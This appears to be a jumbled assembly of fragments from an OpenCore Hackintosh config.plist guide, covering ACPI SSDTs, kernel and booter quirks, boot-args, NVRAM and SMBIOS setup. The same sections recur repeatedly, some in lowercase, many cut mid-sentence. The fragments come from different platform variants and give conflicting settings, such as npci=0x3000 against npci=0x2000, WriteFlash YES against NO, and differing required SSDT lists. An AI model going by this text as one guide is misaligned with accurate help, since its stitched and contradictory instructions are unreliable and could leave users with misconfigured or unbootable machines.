applertc from writing to primary checksum (0x58-0x59), required for users who either receive bios reset or are sent into safe mode after reboot/shutdown\n * extendbtfeatureflags no\n   * helpful for those having continuity issues with non-apple/non-fenvi cards\n * lapickernelpanic: no\n   * disables kernel panic on ap core lapic interrupt, generally needed for hp systems. clover equivalent is kernel lapic\n * legacycommpage: no\n   * resolves ssse3 requirement for 64 bit cpus in macos, mainly relevant for 64-bit pentium 4 cpus(ie. prescott)\n * panicnokextdump: yes\n   * allows for reading kernel panics logs when kernel panics occur\n * powertimeoutkernelpanic: yes\n   * helps fix kernel panics relating to power changes with apple drivers in macos catalina, most notably with digital audio.\n * providecurrentcpuinfo: yes\n   * provides the kernel with cpu frequency values for amd.\n * setapfstrimtimeout: -1\n   * sets trim timeout in microseconds for apfs filesystems on ssds, only applicable for macos 10.14 and newer with problematic ssds.\n * xhciportlimit: yes\n   * this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\n\n# scheme\n\nsettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n# boot\n\ninfo\n\nquirk           enabled   comment\nhideauxiliary   yes       press space to show macos recovery and other auxiliary\n

info\n\n * allowsetdefault: yes\n   \n   * allow ctrl+enter and ctrl+index to set default boot device in the picker\n\n * apecid: 0\n   \n   * used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information,

omit this setting. you will regret it if you don't set it to optional, note that it is case-sensitive\n\n * scanpolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to security section for further details. will not boot usb devices with this set to default\n\n * securebootmodel: default\n   \n   * controls apple's secure boot functionality in macos, please refer to security section for further details.\n   * note: users may find upgrading opencore on an already installed system can result in early boot failures. to resolve this, see here: stuck on ocb: loadimage failed - security violation\n\n\n# serial\n\nused for serial debugging (leave everything as default).\n\n\n# tools\n\nused for running oc debugging tools like the shell, propertree's snapshot function will add these for you.\n\n\n# entries\n\nused for specifying irregular boot paths that can't be found naturally with opencore.\n\nwon't be covered here, see 8.6 of configuration.pdf for more info\n\n\n#

purpose boot-args:\n\nboot-args     description\n-v            this enables verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x3000   this disables some pci debugging related to\n              kiopciconfiguratorpfm64 and giopcitunnelledkey. this is an\n              alternative to having above 4g decoding enabled in your\n              bios. do not use this unless you don't have it in your bios.\n              required for when getting stuck on [pci configuration begin]\n              as there are irq conflicts relating to your pci lanes.\n              source\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args        description\nagdpmod=pikera   used for disabling board id checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the hardware video encoder\nradpg=15         used for disabling some power-gating modes, helpful for\n                 properly initializing amd cape verde based gpus\nunfairgva=1      used for fixing hardware drm support on supported amd gpus\nnvda_drv_vrl=1   used for enabling nvidia's web drivers on maxwell and pascal\n                 cards in macos sierra and high sierra\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip).\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like boot-args should be left alone. for us, we'll be changing the following:\n\nquirk        enabled\nwriteflash   yes\n\nmore in-depth info\n\n * legacyschema\n   \n   * used for assigning nvram variables, used with openvariableruntimedxe.efi. only needed for systems without native nvram\n\n * writeflash: yes\n   \n   * enables writing to flash memory for all added variables.\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this example, we'll choose the macpro7,1 smbios but some smbios play with certain gpus better than others:\n\n * macpro7,1: amd polaris and newer\n   * note that macpro7,1 is exclusive to macos 10.15, catalina and newer\n * imacpro1,1: nvidia maxwell and pascal or amd polaris and newer\n   * use if you need high sierra or mojave, otherwise use macpro7,1\n * imac14,2: nvidia maxwell and pascal\n   * use if you get black screens on imacpro1,1 after installing web drivers with an nvidia gpu\n * macpro6,1: amd gcn gpus (supported hd and r5/r7/r9 series)\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n  #######################################################\n #               macpro7,1 smbios info

not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold.

Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly.

And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS    DESCRIPTION\nSSDT-PLUG         Allows for native CPU power management on Haswell and newer,\n                  see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX      Fixes both the embedded controller and USB power, see\n                  Getting Started With ACPI Guide for more details.\nSSDT-RTC0-RANGE   Required for all Big Sur users to ensure their RTC device is\n                  compatible, see Getting Started With ACPI Guide for more\n                  details.\nSSDT-UNC          Required for all Big Sur users to ensure their UNC devices\n                  are compatible, see Getting Started With ACPI Guide for more\n                  details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation.

Required for Broadwell-E and lower\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * IncreasePciBarSize: NO\n   * Increases 32-bit PCI bar size in IOPCIFamily from 1 to 4 GB, enabling Above4GDecoding in the BIOS is a much cleaner and safer approach. Some X99 boards may require this, you'll generally experience a kernel panic on IOPCIFamily if you need this. Note this shouldn't be needed on Mojave and newer\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi

optional to omit this setting. you\n                                  will regret it if you don't set it to optional, note that it\n                                  is case-sensitive\n\nmore in-depth info\n\n * allowsetdefault: yes\n   \n   * allow ctrl+enter and ctrl+index to set default boot device in the picker\n\n * apecid: 0\n   \n   * used for netting personalized secure-boot identifiers, currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information,

purpose boot-args:\n\nboot-args     description\n-v            this enables verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x2000   this disables some pci debugging related to\n              kiopciconfiguratorpfm64, alternative is npci=0x3000 which\n              disables debugging related to giopcitunnelledkey in\n              addition. required for when getting stuck on pci start\n              configuration as there are irq conflicts relating to your\n              pci lanes. source\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args        description\nagdpmod=pikera   used for disabling board id checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the hardware video encoder\nradpg=15         used for disabling some power-gating modes, helpful for\n                 properly initializing amd cape verde based gpus\nunfairgva=1      used for fixing hardware drm support on supported amd gpus\nnvda_drv_vrl=1   used for enabling nvidia's web drivers on maxwell and pascal\n                 cards in macos sierra and high sierra\n\n * csr-active-config: 00000000\n   \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like boot-args should be left alone. due to nvram issues on x99, we'll be changing the following:\n\nquirk             enabled\nlegacyoverwrite   yes\nwriteflash        no\n\nmore in-depth info\n\n * legacyoverwrite: yes\n   \n   * permits overwriting firmware variables from nvram.plist, only needed for systems without native nvram like x99\n\n * legacyschema\n   \n   * used for assigning nvram variables, used with openvariableruntimedxe.efi. only needed for systems without native nvram\n\n * writeflash: no\n   \n   * enables writing to flash memory for all added variables, not compatible with emulated nvram\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this broadwell-e example, we'll choose the imacpro1,1 smbios.\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n  #######################################################\n #              imacpro1,1 smbios info                 #\n#######################################################\n\ntype:

serial part gets copied to generic -> systemserialnumber.\n\nthe board serial part gets copied to generic -> mlb.\n\nthe smuuid part gets copied to generic -> systemuuid.\n\nwe set generic -> rom to either an apple rom (dumped from a real mac), your nic mac address, or any random mac address (could be just 6 random bytes, for this guide we'll use 11223300 0000. after install follow the fixing iservices page on how to find your real mac address)\n\nreminder that you need an invalid serial! when inputting your serial number in apple's check coverage page, you should get a message such as \"unable to check coverage for this serial number.\"\n\nautomatic: yes\n\n * generates platforminfo based on generic section instead of datahub, nvram, and smbios sections\n\n\n# generic\n\nmore

not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS    DESCRIPTION\nSSDT-PLUG         Allows for native CPU power management on Haswell and newer,\n                  see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX      Fixes both the embedded controller and USB power, see\n                  Getting Started With ACPI Guide for more details.\nSSDT-RTC0-RANGE   Required for all Big Sur users to ensure their RTC device is\n                  compatible, see Getting Started With ACPI Guide for more\n                  details.\nSSDT-UNC          Required for all Big Sur users to ensure their UNC devices\n                  are compatible, see Getting Started With ACPI Guide for more\n                  details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page.

Required for Broadwell-E and lower\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * IncreasePciBarSize: NO\n   * Increases 32-bit PCI bar size in IOPCIFamily from 1 to 4 GB, enabling Above4GDecoding in the BIOS is a much cleaner and safer approach. Some X99 boards may require this, you'll generally experience a kernel panic on IOPCIFamily if you need this. Note this shouldn't be needed on Mojave and newer\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems.

After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory.

may seem hard, it's not. it just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal

and such. and with our system, it's even required to boot. guide on making them found here: getting started with acpi\n\nfor us we'll need a couple of ssdts to bring back functionality that clover provided:\n\nrequired ssdts    description\nssdt-plug         allows for native cpu power management on haswell and newer,\n                  see getting started with acpi guide for more

unc devices\n                  are compatible, see getting started with acpi guide for more\n                  details.\n\nnote that you should not add your generated dsdt.aml here, it is already in your firmware. so if present, remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, our patches are handled by our ssdts. this is a much cleaner solution as this will allow us to boot windows and other oses with opencore\n\n\n# quirks\n\nsettings relating to acpi, leave everything here as default as we have no use for these quirks.\n\n\n# booter\n\n\n\nthis section is dedicated to quirks relating to boot.efi patching with openruntime, the replacement for

currently this quirk is unreliable due to a bug in the macos installer so we highly encourage you to leave this as default.\n\n * authrestart: no\n   \n   * enables authenticated restart for filevault 2 so password is not required on reboot. can be considered a security risk so optional\n\n * blacklistappleupdate: yes\n   \n   * used for blocking firmware updates, used as extra level of protection as macos big sur no longer uses run-efi-updater variable\n\n * dmgloading: signed\n   \n   * ensures only signed dmgs load\n\n * exposesensitivedata: 6\n   \n   * shows more debug information,

purpose boot-args:\n\nboot-args     description\n-v            this enables verbose mode, which shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nnpci=0x2000   this disables some pci debugging related to\n              kiopciconfiguratorpfm64, alternative is npci=0x3000 which\n              disables debugging related to giopcitunnelledkey in\n              addition. required for when getting stuck on pci start\n              configuration as there are irq conflicts relating to your\n              pci lanes. source\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to

description\nagdpmod=pikera   used for disabling board id checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the hardware

  \n   * settings for 'system integrity protection' (sip). it is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear instead at first boot up.\n\nkey             type     value\nprev-lang:kbd   string   en-us:0\n\n\n# delete\n\ninfo\n\nforcibly rewrites nvram variables, do note that add will not overwrite values already present in nvram so values like boot-args should be left alone. due to nvram issues on x99, we'll be changing the following:\n\nquirk             enabled\nlegacyoverwrite   yes\nwriteflash

variables, not compatible with emulated nvram\n\n\n# platforminfo\n\n\n\ninfo\n\nfor setting up the smbios info, we'll use corpnewt's gensmbios application.\n\nfor this haswell-e example, we'll choose the imacpro1,1 smbios.\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly.

Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-UNC         Required for all Big Sur users to ensure their UNC devices\n                 are compatible, see Getting Started With ACPI Guide for more\n                 details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with 